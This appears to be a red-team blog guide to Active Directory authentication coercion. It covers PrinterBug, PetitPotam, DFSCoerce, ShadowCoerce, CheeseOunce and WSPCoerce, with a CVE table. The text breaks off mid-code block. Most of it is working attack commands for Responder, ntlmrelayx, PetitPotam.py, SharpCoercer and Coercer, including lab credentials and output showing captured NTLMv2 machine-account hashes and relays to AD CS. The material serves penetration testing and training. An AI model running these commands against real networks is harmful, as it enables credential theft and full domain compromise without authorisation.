---
title: "Authentication Coercion - A Complete Guide to Techniques, Tools & CVEs"
date: 2026-03-23 15:00:00 +0200
categories: [Active Directory, NTLM Relay Attacks]
tags: [authentication-coercion, ntlm-relay, petitpotam, printerbug, dfscoerce, shadowcoerce, coercer, active-directory, red-team, penetration-testing]
description: "A comprehensive guide covering all known authentication coercion techniques in Active Directory environments. Includes tools, CVEs, practical examples from both Linux and Windows attack machines, and mitigation strategies."
image:
  path: /assets/img/posts/auth-coercion-banner.jpg
  alt: Authentication Coercion Attack Flow
pin: true
---

## What is Authentication Coercion?

Authentication coercion is a technique where an attacker forces a target machine to initiate authentication against an attacker-controlled system — even if the target never intended to authenticate. Unlike poisoning or spoofing attacks (which are opportunistic and wait for broadcast traffic), coercion attacks are **target-centric** and **deterministic**.

> The root cause of this vulnerability/feature is that **Windows machines automatically authenticate to other machines when trying to access UNC paths** like `\\172.16.117.30\file.txt`.
>
> — [@podalirius_](https://twitter.com/podalirius_)
{: .prompt-info }

The general attack flow works as follows:

1. **Authenticate** to a remote machine using valid domain credentials (usually over SMB).
2. **Connect** to a remote SMB pipe such as `\PIPE\netdfs`, `\PIPE\efsrpc`, `\PIPE\lsarpc`, or `\PIPE\lsass`.
3. **Bind** to an RPC protocol to call its methods, forcing the target to connect back to the attacker-controlled machine.
4. **Capture or Relay** the coerced NTLM authentication (hash capture via Responder, or relay via ntlmrelayx).

When chained with NTLM relay attacks, authentication coercion can lead to **complete Active Directory domain compromise** — targeting AD CS (ESC8/ESC11), LDAP for Shadow Credentials or RBCD, or unconstrained delegation hosts for TGT capture.

---

## Coercion Techniques Reference Table

| Technique | Protocol | SMB Pipe | Auth Required | SMB Coercion | HTTP Coercion | CVE |
|:----------|:---------|:---------|:--------------|:-------------|:--------------|:----|
| **PrinterBug** | MS-RPRN | `\PIPE\spoolss` | Yes | Yes | Yes (WebDAV) | N/A (by design) |
| **PetitPotam** | MS-EFSR | `\PIPE\lsarpc`, `\PIPE\efsrpc` | Yes* | Yes | Yes (WebDAV) | [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942), [CVE-2022-26925](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26925) |
| **DFSCoerce** | MS-DFSNM | `\PIPE\netdfs` | Yes | Yes | No | N/A |
| **ShadowCoerce** | MS-FSRVP | `\PIPE\FssagentRpc` | Yes | Yes | No | [CVE-2022-30154](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30154) |
| **CheeseOunce** | MS-EVEN | `\PIPE\eventlog` | Yes | Yes | No | N/A |
| **WSPCoerce** | MS-WSP | N/A (direct RPC) | Yes | Yes | No | N/A (WONTFIX) |
| **PrintNightmare** | MS-PAR | `\PIPE\spoolss` | Yes | Yes | Yes (WebDAV) | [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) |
| **PushSubscription** | EWS API | N/A (HTTP API) | Yes | No | Yes | N/A (patched Feb 2019) |

> *PetitPotam originally allowed **unauthenticated** coercion via `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` before CVE-2021-36942 was patched. Some methods remain unpatched.
{: .prompt-warning }

---

## Related CVEs

Understanding the CVEs associated with authentication coercion is critical for both exploitation and remediation.

### CVE-2021-36942 — PetitPotam (Unauthenticated EFSR Coercion)

| Field | Value |
|:------|:------|
| **Protocol** | MS-EFSR |
| **Impact** | Unauthenticated attackers could force any domain-joined machine (including DCs) to authenticate to an attacker-controlled host |
| **CVSS** | 7.5 (High) |
| **Methods** | `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv` |
| **Patch** | August 2021 Security Update |
| **Notes** | Only two methods were patched; other EFSR methods remain exploitable with valid credentials |

### CVE-2022-26925 — Windows LSA Spoofing (PetitPotam Variant)

| Field | Value |
|:------|:------|
| **Protocol** | LSARPC |
| **Impact** | Unauthenticated coercion of DC authentication, actively exploited in the wild |
| **CVSS** | 8.1 (High) — 9.8 when chained with relay |
| **Patch** | May 2022 Patch Tuesday |
| **Notes** | Listed in CISA's Known Exploited Vulnerabilities (KEV) catalog. Researcher Raphael John discovered this was essentially a bypass of the CVE-2021-36942 patch |

### CVE-2022-30154 — ShadowCoerce (MS-FSRVP)

| Field | Value |
|:------|:------|
| **Protocol** | MS-FSRVP |
| **Impact** | Authenticated coercion via `IsPathSupported` and `IsPathShadowCopied` methods |
| **CVSS** | 5.3 (Medium) |
| **Patch** | June 2022 (KB5014692) |
| **Notes** | Requires "File Server VSS Agent Service" to be enabled on the target |

### CVE-2021-34527 — PrintNightmare

| Field | Value |
|:------|:------|
| **Protocol** | MS-RPRN / MS-PAR |
| **Impact** | Remote code execution and privilege escalation via Print Spooler; also used for authentication coercion |
| **CVSS** | 8.8 (High) |
| **Patch** | July 2021 Out-of-Band Update |
| **Notes** | Exploited by Russian state-sponsored groups per CISA. Listed in CISA KEV catalog |

### CVE-2021-1675 — Print Spooler RCE

| Field | Value |
|:------|:------|
| **Protocol** | MS-RPRN |
| **Impact** | RCE in Windows Print Spooler, predecessor to PrintNightmare |
| **CVSS** | 8.8 (High) |
| **Patch** | June 2021 Patch Tuesday |

### CVE-2023-23397 — Outlook NTLM Leak

| Field | Value |
|:------|:------|
| **Protocol** | MAPI (Outlook) |
| **Impact** | Specially crafted email causes Outlook to leak NTLM hashes to attacker-controlled SMB server without user interaction |
| **CVSS** | 9.8 (Critical) |
| **Patch** | March 2023 Patch Tuesday |
| **Notes** | Exploited in the wild by APT28 (Fancy Bear). No user click required |

### CVE-2024-21413 — Outlook MonikerLink RCE

| Field | Value |
|:------|:------|
| **Protocol** | Outlook / OLE |
| **Impact** | Bypasses Outlook's Protected View to leak NTLM credentials and achieve RCE |
| **CVSS** | 9.8 (Critical) |
| **Patch** | February 2024 Patch Tuesday |

### CVE-2023-36563 — WordPad NTLM Leak

| Field | Value |
|:------|:------|
| **Protocol** | WordPad / RTF |
| **Impact** | NTLM hash disclosure via specially crafted document |
| **CVSS** | 6.5 (Medium) |
| **Patch** | October 2023 Patch Tuesday |

### CVE-2025-50154 — Windows Explorer Shortcut NTLM Coercion

| Field | Value |
|:------|:------|
| **Protocol** | Windows Explorer (LNK processing) |
| **Impact** | Browsing a folder containing a malicious `.lnk` file triggers NTLM authentication to attacker-controlled SMB server |
| **CVSS** | 6.5 (Medium) |
| **Patch** | August 2025 |
| **Notes** | No user interaction beyond folder browsing required |

### CVE-2025-33073 — Reflective NTLM Relay via SMB Client

| Field | Value |
|:------|:------|
| **Protocol** | SMB Client |
| **Impact** | Allows unauthorized remote command execution and privilege escalation in AD environments through reflective NTLM relay |
| **CVSS** | 7.0 (High) |
| **Patch** | June 2025 Patch Tuesday |
| **Notes** | Zero-day; combines DNS poisoning with coercion for reflective relay |

### CVE-2025-54918 — NTLM LDAP Auth Bypass

| Field | Value |
|:------|:------|
| **Protocol** | LDAP / NTLM |
| **Impact** | Combines coercion with NTLM relay manipulation to bypass channel binding and LDAP signing, achieving DC compromise |
| **CVSS** | Critical |
| **Patch** | October 2025 |
| **Notes** | Bypasses traditional security controls including EPA and LDAP signing |

---

## Setting Up the Listener

Before running any coercion technique, you need a listener to capture or relay the coerced authentication.

### Capturing Hashes with Responder

#### Linux

```bash
# Start Responder to capture SMB hashes
hacker@root[/root]$ sudo python3 Responder.py -I eth0
```

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Listening for events...
```

#### Windows

```powershell
# Using Inveigh (PowerShell-based LLMNR/NBNS/mDNS/DNS/DHCPv6 spoofer and NTLM relay tool)
PS C:\Tools> Import-Module .\Inveigh.ps1
PS C:\Tools> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```

```
[*] Inveigh 1.506 started at 2026-03-23T15:00:00
[+] Listening on 172.16.117.30
[+] SMB Capture: Enabled
[+] HTTP Capture: Enabled
```

### Relaying with ntlmrelayx

#### Linux

```bash
# Relay to AD CS web enrollment (ESC8)
hacker@root[/root]$ python3 ntlmrelayx.py -t http://CA01.inlanefreight.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

```
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Windows

On Windows, you can use [NtlmRelayX.NET](https://github.com/CCob/NtlmRelayX) or proxy traffic through your tools:

```powershell
# Using NtlmRelayX .NET port (if available)
PS C:\Tools> .\NtlmRelayX.exe -t ldap://DC01.inlanefreight.local --delegate-access
```

---

## Enabling WebClient for HTTP Coercion

To coerce **HTTP** NTLM authentication (instead of SMB), the **WebClient service** must be running on the target. This is critical because HTTP-based coercion bypasses SMB signing requirements.

### Using CrackMapExec / NetExec to Enable WebClient

#### Linux

```bash
# Drop a .searchConnector-ms file to trigger WebClient activation
hacker@root[/root]$ crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=Testing FILENAME=@secret
```

```
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous:
DROP-SC     172.16.117.3    445    DC01             [+] Found writable share: Testing
DROP-SC     172.16.117.3    445    DC01             [+] [OPSEC] Created @secret.searchConnector-ms file on the Testing share
```

After waiting a couple of minutes, verify WebDAV is enabled:

```bash
hacker@root[/root]$ crackmapexec smb 172.16.117.60 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav
```

```
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
WEBDAV      172.16.117.60   445    SQL01            WebClient Service enabled on: 172.16.117.60
```

#### Windows

```powershell
# Check if WebClient is running on target (requires admin on target or use CrackMapExec)
PS C:\Tools> Get-Service WebClient -ComputerName SQL01

Status   Name               DisplayName
------   ----               -----------
Running  WebClient          WebClient

# Alternatively, trigger WebClient start with a search connector file via SMB
PS C:\Tools> Copy-Item ".\@secret.searchConnector-ms" "\\DC01\Testing\@secret.searchConnector-ms"
```

---

## Technique 1: MS-RPRN — PrinterBug

The PrinterBug abuses the [Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) (MS-RPRN). It takes advantage of the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, which creates a remote change notification object that forces the target to send authentication back to the attacker.

| Property | Value |
|:---------|:------|
| **Protocol** | MS-RPRN |
| **Service** | Print Spooler (runs by default on all Windows machines) |
| **Named Pipe** | `\PIPE\spoolss` |
| **Auth Required** | Yes (domain credentials) |
| **Coercion Types** | SMB, HTTP (if WebClient is running) |

### From a Linux Attack Machine

#### SMB Coercion with printerbug.py

```bash
hacker@root[/root]$ python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.3 172.16.117.30
```

```
[*] Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Attempting to trigger authentication via rprn RPC at 172.16.117.3
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

**Responder captures the hash:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:24044d80125dd669:F3DC56D71629EA180ED2C542D622AF79:0101000000000000804E...
```

#### HTTP Coercion (WebDAV) with printerbug.py

For HTTP coercion, set the listener as a WebDAV connection string: `ATTACKER_NAME@PORT/PATH`

```bash
hacker@root[/root]$ python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 SUPPORTPC@80/print
```

```
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at 172.16.117.60
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

**Responder captures HTTP/WebDAV hash:**

```
[*] [NBT-NS] Poisoned answer sent to 172.16.117.60 for name SUPPORTPC (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.117.60 for name supportpc
[HTTP] Sending NTLM authentication request to fe80::1559:28a9:7c9:caca
[WebDAV] NTLMv2 Client   : fe80::1559:28a9:7c9:caca
[WebDAV] NTLMv2 Username : INLANEFREIGHT\SQL01$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:26f495d9cf2db5ee:4AA96074630A7A9F52DA1D66284DC2D9:0101000000000000993E...
```

> The WebDAV connection string format is `ATTACKER_MACHINE_NAME@PORT/PATH`. The machine name must be a NetBIOS or DNS name — not an IP address. Responder provides one by default, or you can set it to an arbitrary string.
{: .prompt-tip }

### From a Windows Attack Machine

#### SpoolSample (C#)

```powershell
# SMB Coercion
PS C:\Tools> .\SpoolSample.exe DC01.inlanefreight.local ATTACKER01.inlanefreight.local
```

```
[+] Converted DLL to shellcode
[+] Executing SpoolSample with target DC01.inlanefreight.local and capture server ATTACKER01.inlanefreight.local
[+] RpcRemoteFindFirstPrinterChangeNotification successfully called!
[+] Coercion attempt completed
```

**Inveigh captures:**

```
[+] 2026-03-23T15:05:23 - SMB NTLMv2 captured from 172.16.117.3(DC01):
    Username: INLANEFREIGHT\DC01$
    Hash: DC01$::INLANEFREIGHT:1122334455667788:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6:01010000000000...
```

#### SharpCoercer (C# — Covers All Protocols)

```powershell
# SMB Coercion with MS-RPRN filter
PS C:\Tools> .\SharpCoercer.exe -t DC01.inlanefreight.local -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -r MS-RPRN -c
```

```
[*] SharpCoercer v1.0.0
[*] Target: DC01.inlanefreight.local
[*] Listener: 172.16.117.30
[+] Connecting to \\DC01.inlanefreight.local\PIPE\spoolss
[+] Successfully bound to MS-RPRN interface
[*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx...
[+] RPC call completed - coercion triggered!
```

---

## Technique 2: MS-EFSR — PetitPotam

[PetitPotam](https://github.com/topotam/PetitPotam) abuses the [Encrypting File System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) (MS-EFSR). It targets multiple methods including `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, and others.

| Property | Value |
|:---------|:------|
| **Protocol** | MS-EFSR (EFSRPC) |
| **Named Pipes** | `\PIPE\lsarpc`, `\PIPE\efsrpc`, `\PIPE\samr`, `\PIPE\lsass`, `\PIPE\netlogon` |
| **Auth Required** | Yes (No for unpatched CVE-2021-36942) |
| **Coercion Types** | SMB, HTTP (if WebClient is running) |
| **CVEs** | CVE-2021-36942, CVE-2022-26925 |

> Prior to patching CVE-2021-36942, attackers **without valid domain credentials** could coerce authentication from any domain-joined machine, including domain controllers. If you encounter hosts where `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` are patched, try [ly4k's PetitPotam](https://github.com/ly4k/PetitPotam) which implements additional unpatched methods.
{: .prompt-warning }

### From a Linux Attack Machine

#### SMB Coercion with PetitPotam.py

```bash
hacker@root[/root]$ python3 PetitPotam.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local
```

```
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.117.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Responder captures SMB hash:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:24044d80125dd669:F3DC56D71629EA180ED2C542D622AF79:0101000000000000804E...
```

#### HTTP Coercion (WebDAV) with PetitPotam.py

```bash
hacker@root[/root]$ python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe'
```

```
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.117.60[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Responder captures WebDAV hash:**

```
[*] [LLMNR]  Poisoned answer sent to 172.16.117.60 for name win-mmrqdg2r0zx
[*] [MDNS] Poisoned answer sent to 172.16.117.60   for name win-mmrqdg2r0zx.local
[WebDAV] NTLMv2 Client   : fe80::1559:28a9:7c9:caca
[WebDAV] NTLMv2 Username : INLANEFREIGHT\SQL01$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:715dc37f7e25ef48:F5A3856A112F4159F0F2715AA1F31E22:0101000000000000E8C0...
```

### From a Windows Attack Machine

#### PetitPotam.exe (Compiled C Version)

```powershell
# SMB Coercion
PS C:\Tools> .\PetitPotam.exe 172.16.117.30 DC01.inlanefreight.local
```

```
Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.inlanefreight.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### SharpCoercer (C# — MS-EFSR Filter)

```powershell
PS C:\Tools> .\SharpCoercer.exe -t DC01.inlanefreight.local -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -r MS-EFSR -c
```

```
[*] SharpCoercer v1.0.0
[*] Target: DC01.inlanefreight.local
[*] Listener: 172.16.117.30
[+] Connecting to \\DC01.inlanefreight.local\PIPE\lsarpc
[+] Successfully bound to MS-EFSR interface (c681d488-d850-11d0-8c52-00c04fd90f7e)
[*] Calling EfsRpcOpenFileRaw (opnum 0)... rpc_s_access_denied (PATCHED)
[*] Calling EfsRpcEncryptFileSrv (opnum 4)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcDecryptFileSrv (opnum 5)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcQueryUsersOnFile (opnum 6)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcQueryRecoveryAgents (opnum 7)... ERROR_BAD_NETPATH (SUCCESS!)
[+] Coercion completed - 4/5 methods successful
```

---

## Technique 3: MS-DFSNM — DFSCoerce

[DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) abuses the `NetrDfsAddStdRoot` and `NetrDfsRemoveStdRoot` methods of the [Distributed File System Namespace Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) (MS-DFSNM).

| Property | Value |
|:---------|:------|
| **Protocol** | MS-DFSNM |
| **Named Pipe** | `\PIPE\netdfs` |
| **Auth Required** | Yes |
| **Coercion Types** | SMB only |
| **Availability** | Servers only (DFS Namespace role) |

### From a Linux Attack Machine

```bash
hacker@root[/root]$ python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3
```

```
[-] Connecting to ncacn_np:172.16.117.3[\PIPE\netdfs]
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!
NetrDfsRemoveStdRoot
ServerName:                      '172.16.117.30\x00'
RootShare:                       'test\x00'
ApiFlags:                        1

DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

**Responder output:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:e2d2339638fc5fd6:D4979A923DD76BC3CFA418E94958E2B0:010100000000000000E0...
```

### From a Windows Attack Machine

#### SharpCoercer (C# — MS-DFSNM Filter)

```powershell
PS C:\Tools> .\SharpCoercer.exe -t DC01.inlanefreight.local -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -r MS-DFSNM -c
```

```
[*] SharpCoercer v1.0.0
[*] Target: DC01.inlanefreight.local
[*] Listener: 172.16.117.30
[+] Connecting to \\DC01.inlanefreight.local\PIPE\netdfs
[+] Successfully bound to MS-DFSNM interface (4fc742e0-4a10-11cf-8273-00aa004ae673)
[*] Calling NetrDfsRemoveStdRoot (opnum 13)... rpc_s_access_denied (COERCION TRIGGERED!)
[*] Calling NetrDfsAddStdRoot (opnum 12)... rpc_s_access_denied (COERCION TRIGGERED!)
[+] Coercion completed - 2/2 methods triggered
```

---

## Technique 4: MS-FSRVP — ShadowCoerce

[ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) abuses the `IsPathSupported` and `IsPathShadowCopied` methods of the [File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b) (MS-FSRVP).

| Property | Value |
|:---------|:------|
| **Protocol** | MS-FSRVP |
| **Named Pipe** | `\PIPE\FssagentRpc` |
| **Auth Required** | Yes |
| **Coercion Types** | SMB only |
| **Requirement** | "File Server VSS Agent Service" must be enabled on target |
| **CVE** | CVE-2022-30154 (patched June 2022) |

### From a Linux Attack Machine

```bash
hacker@root[/root]$ python3 shadowcoerce.py -d inlanefreight.local -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3
```

```
[*] Connecting to ncacn_np:172.16.117.3[\PIPE\FssagentRpc]
[+] Connected!
[+] Binding to a]1c6e34c2-d1e0-4ff9-88e5-bc0f71e0b5ba
[+] Successfully bound!
[*] Attempting IsPathShadowCopied coercion...
[+] IsPathShadowCopied returned ERROR_BAD_NETPATH - coercion successful!
[*] Attempting IsPathSupported coercion...
[+] IsPathSupported returned ERROR_BAD_NETPATH - coercion successful!
```

**Responder captures:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:a8b3c4d5e6f7a8b9:C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9:0101000000000000...
```

> ShadowCoerce may need to be run **twice** if the FssAgent service hasn't been requested recently. Run the command again if it doesn't work on the first attempt.
{: .prompt-tip }

### From a Windows Attack Machine

#### SharpCoercer (C# — MS-FSRVP Filter)

```powershell
PS C:\Tools> .\SharpCoercer.exe -t DC01.inlanefreight.local -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -r MS-FSRVP -c
```

```
[*] SharpCoercer v1.0.0
[*] Target: DC01.inlanefreight.local
[*] Listener: 172.16.117.30
[+] Connecting to \\DC01.inlanefreight.local\PIPE\FssagentRpc
[+] Successfully bound to MS-FSRVP interface
[*] Calling IsPathSupported... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling IsPathShadowCopied... ERROR_BAD_NETPATH (SUCCESS!)
[+] Coercion completed - 2/2 methods successful
```

---

## Technique 5: MS-EVEN — CheeseOunce

CheeseOunce abuses the `ElfrOpenBELW` method of the [EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even) (MS-EVEN). This technique was observed being used in a [real-world attack against a healthcare organization in March 2025](https://unit42.paloaltonetworks.com/authentication-coercion/).

| Property | Value |
|:---------|:------|
| **Protocol** | MS-EVEN |
| **Named Pipe** | `\PIPE\eventlog` |
| **Auth Required** | Yes |
| **Coercion Types** | SMB only |
| **Key Method** | `ElfrOpenBELW` (opnum 9) |

> CheeseOunce is particularly dangerous because MS-EVEN is rarely monitored by security teams, making it an ideal choice for attackers looking to evade detection. Unit 42 documented a real-world attack where threat actors used this technique to coerce authentication from Domain Controllers, RODCs, RADIUS servers, and Citrix servers.
{: .prompt-danger }

### From a Linux Attack Machine

```bash
# Using Coercer tool (covers MS-EVEN automatically)
hacker@root[/root]$ Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local -v --always-continue
```

```
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [+] (ERROR_BAD_NETPATH) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\172.16.117.30\sXd63wiK\aa')
```

### From a Windows Attack Machine

```powershell
# Using SharpCoercer with MS-EVEN (included under eventlog pipe)
PS C:\Tools> .\SharpCoercer.exe -t 172.16.117.50 -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -np eventlog -c
```

```
[*] SharpCoercer v1.0.0
[+] Connecting to \\172.16.117.50\PIPE\eventlog
[+] Successfully bound to MS-EVEN interface (82273fdc-e32a-18c3-3f78-827929dc23ea)
[*] Calling ElfrOpenBELW (opnum 9)... ERROR_BAD_NETPATH (COERCION TRIGGERED!)
```

---

## Technique 6: MS-WSP — WSPCoerce

[WSPCoerce](https://github.com/slemire/WSPCoerce) abuses the [Windows Search Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsp/) (MS-WSP) to coerce authentication. It targets the Windows Search Service.

| Property | Value |
|:---------|:------|
| **Protocol** | MS-WSP |
| **Auth Required** | Yes (domain user, no special privileges) |
| **Coercion Types** | SMB only |
| **Target Scope** | **Workstations only** (Windows Search Service not enabled by default on servers since Server 2016) |
| **Status** | Microsoft: WONTFIX |

### From a Windows Attack Machine

WSPCoerce is written in C# and runs natively on Windows:

```powershell
PS C:\Tools> .\WSPCoerce.exe LABWS1 172.16.117.30
```

```
[*] Connecting to LABWS1 via MS-WSP...
[*] Sending search request with UNC path \\172.16.117.30\share...
[+] Search request sent successfully
[+] Coercion triggered - check your listener
```

**Responder/Inveigh captures:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.50
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\LABWS1$
[SMB] NTLMv2-SSP Hash     : LABWS1$::INLANEFREIGHT:d4e5f6a7b8c9d0e1:F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7:0101000000000000...
```

> WSPCoerce requires a **hostname** for the target (not IP or FQDN). Use the short NetBIOS name only.
{: .prompt-warning }

### From a Linux Attack Machine

There is also a Go-based implementation by RedTeam Pentesting:

```bash
